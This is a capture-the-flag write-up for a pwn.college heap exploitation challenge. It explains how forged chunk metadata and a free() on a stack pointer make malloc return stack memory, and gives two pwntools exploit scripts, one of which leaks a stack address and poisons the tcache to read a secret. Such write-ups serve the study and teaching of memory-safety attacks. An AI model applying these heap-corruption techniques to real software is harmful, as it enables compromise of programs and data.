---
layout: post
title: (Dynamic Allocator Misuse) level 13
categories: pwn.college Dynamic-Allocator-Misuse
date: 2025-10-09 08:00:27 +0300
tags: pwn.college PIE ASLR heap house-of-force tecache metadata house-of-spirit
---
## Information
- category: pwn


## Description 
> Leverage calling free() on a stack pointer to read secret data.

## Write-up

**Goal:** manipulate heap metadata to perform an overwrite of a secret value stored on the stack, then trigger verification to get the flag.

---

### Step 1 — Setup: Fake prev_size & size metadata

From analysis of the binary’s heap operations, we can place crafted metadata inside a heap chunk.  
This includes:
- `prev_size` field  
- `size` field  

We overwrite them such that a `free()` call will cause the allocator to treat the chunk as a different size and location.

---

### Step 2 — Free the fake chunk

By freeing the crafted chunk placed on the stack, we control where the **next malloc** returns.  
We pick a large size so that malloc returns a pointer into the stack memory we control.

---

### Step 3 — Overwrite secret

When the vulnerable program uses malloc with our controlled size, it returns a pointer to the stack.  
We then overwrite the secret value with a controlled string (e.g., `"AAA..."`).

Example:
```text
malloc(fake_chunk_size)
free(fake_chunk)
malloc(big_size)    # returns pointer to our target stack location
write("AAA...")
```

## Exploit
```python
from pwn import *

elf = context.binary = ELF("/challenge/stack-summoning-hard")
global p
p = elf.process()

def malloc(idx,size):
    p.sendline(b"malloc")
    p.sendline(idx)
    p.sendline(size)

def free(idx):
    p.sendline(b"free")
    p.sendline(idx)

def puts(idx):
    p.sendline(b"puts")
    p.sendline(idx)

def scanf(idx,data):
    p.sendline(b"scanf")
    p.sendline(idx)
    p.sendline(data)

def stack_free():
    p.sendline(b"stack_free")

def stack_scanf(data):
    p.sendline(b"stack_scanf")
    p.sendline(data)

def send_flag(secret):
    p.sendline(b"send_flag")
    p.sendline(secret)

def exploit():
    data = b"A"*0x30 + p64(0) + p64(0x200)
    stack_scanf(data)

    stack_free()
    
    malloc(b"0",b"500")
    
    data = b"A"*300
    scanf(b"0",data)

    send_flag(b"A"*16)

    p.interactive()

def main():
    exploit()

if __name__ == "__main__":
    main()
```

other approche
```python
from pwn import *

elf = context.binary = ELF("/challenge/stack-summoning-hard")
context.log_level = "debug"
global p
p = elf.process()

def malloc(idx,size):
    p.sendline(b"malloc")
    p.sendline(idx)
    p.sendline(size)

def free(idx):
    p.sendline(b"free")
    p.sendline(idx)

def puts(idx):
    p.sendline(b"puts")
    p.sendline(idx)

def scanf(idx,data):
    p.sendline(b"scanf")
    p.sendline(idx)
    p.sendline(data)

def stack_free():
    p.sendline(b"stack_free")

def stack_scanf(data):
    p.sendline(b"stack_scanf")
    p.sendline(data)

def send_flag(secret):
    p.sendline(b"send_flag")
    p.sendline(secret)

def send_flag():
    p.sendline(b"send_flag")
    p.sendline(b"egrmayqpteprmrxc")

def exploit():
    malloc(b"0",b"32")

    data = b"A"*0x30 + p64(0) + p64(0x30)
    stack_scanf(data)

    stack_free()
    free(b"0")

    puts(b"0")

    p.recvuntil(b"Data: ")
    stack = u64(p.recvline().strip().ljust(8,b"\x00")) + 0xf5 - 0x40 + 8 # first part -8 
    log.success(f"stack: {hex(stack)}")

    malloc(b"0",b"32")
    malloc(b"1",b"32")

    free(b"1")
    free(b"0")

    scanf(b"0",p64(stack))

    malloc(b"0",b"32")
    malloc(b"0",b"32")

    puts(b"0")
    
    p.recvuntil(b"Data: ")
    secret2 = p.recvline()
    log.success(f"secret part 2:{secret2}")

    send_flag()
  
    p.interactive()

def main():
    exploit()

if __name__ == "__main__":
    main()
```
